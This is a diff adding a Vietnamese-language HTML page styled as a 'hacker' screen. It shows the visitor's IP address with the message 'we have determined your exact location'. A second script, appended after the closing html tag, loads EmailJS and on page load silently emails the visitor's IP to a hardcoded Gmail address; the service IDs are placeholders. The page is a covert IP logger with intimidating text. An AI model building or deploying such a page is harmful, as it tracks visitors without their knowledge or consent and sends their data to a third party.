@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lấy địa chỉ IP</title>
+    <!-- Thêm Tailwind CSS từ CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        /* Đảm bảo GIF toàn màn hình */
+        .fullscreen-gif {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Đặt GIF phía sau nội dung */
+            object-fit: cover; /* Đảm bảo GIF phủ kín màn hình */
+        }
+
+        /* Hiệu ứng chữ nhấp nháy */
+        .blinking-cursor {
+            animation: blink 1s steps(2, start) infinite;
+        }
+
+        @keyframes blink {
+            to {
+                visibility: hidden;
+            }
+        }
+
+        /* Phông chữ và màu sắc kiểu hacker */
+        .hacker-text {
+            font-family: 'Courier New', Courier, monospace;
+            color: limegreen;
+            text-shadow: 0 0 5px limegreen;
+        }
+
+        .hacker-box {
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 2px solid limegreen;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: 0 0 20px limegreen;
+        }
+    </style>
+</head>
+<body class="bg-black flex items-center justify-center min-h-screen">
+    <!-- Thẻ GIF toàn màn hình -->
+    <img src="https://i.pinimg.com/originals/29/c6/8c/29c68c38857c0c994ec565ad2dd15776.gif" alt="Background GIF" class="fullscreen-gif">
+
+    <div class="hacker-box text-center relative z-10">
+        <h1 class="text-3xl font-bold hacker-text mb-4">Địa chỉ IP của bạn:</h1>
+        <p id="ip-address" class="text-2xl font-mono hacker-text blinking-cursor">Đang tải...</p>
+        <p class="text-sm hacker-text mt-4">Chúng tôi đã xác định vị trí chính xác của bạn.</p>
+    </div>
+
+    <script>
+        // Sử dụng API của ip-api để lấy địa chỉ IP
+        fetch('http://ip-api.com/json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.query; // Lấy địa chỉ IP từ phản hồi
+                document.getElementById('ip-address').textContent = ipAddress + " █"; // Thêm con trỏ nhấp nháy
+            })
+            .catch(error => {
+                console.error('Lỗi khi lấy địa chỉ IP:', error);
+                document.getElementById('ip-address').textContent = 'Không thể lấy địa chỉ IP. █';
+            });
+    </script>
+</body>
+</html>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+    // Khởi tạo EmailJS
+    emailjs.init('YOUR_USER_ID');
+
+    fetch('http://ip-api.com/json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.query; // Lấy địa chỉ IP từ phản hồi
+            document.getElementById('ip-address').textContent = ipAddress + " █"; // Hiển thị IP
+
+            // Gửi email
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
+                to_email: 'stronggwall04@gmail.com',
+                ip_address: ipAddress
+            })
+            .then(response => console.log('Email đã được gửi!', response))
+            .catch(error => console.error('Lỗi khi gửi email:', error));
+        })
+        .catch(error => {
+            console.error('Lỗi khi lấy địa chỉ IP:', error);
+            document.getElementById('ip-address').textContent = 'Không thể lấy địa chỉ IP. █';
+        });
+</script>
